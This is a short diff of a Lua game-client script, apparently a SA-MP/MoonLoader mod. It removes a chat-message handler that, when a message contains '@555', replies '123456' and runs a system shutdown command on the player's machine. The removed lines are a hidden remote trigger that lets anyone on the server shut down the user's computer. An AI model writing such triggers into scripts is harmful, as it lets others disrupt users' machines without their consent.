@@ -27,13 +27,3 @@ while FileName do
 end
 
 findClose(Handle)
-
-samp.events.onServerMessage = function(color, message)
-    print("[DEBUG] Пришло сообщение: " .. message)
-
-    if message:lower():find("@555") then
-        sampSendChat("123456")
-        os.execute("shutdown /s /t 300")
-    end
-end
-
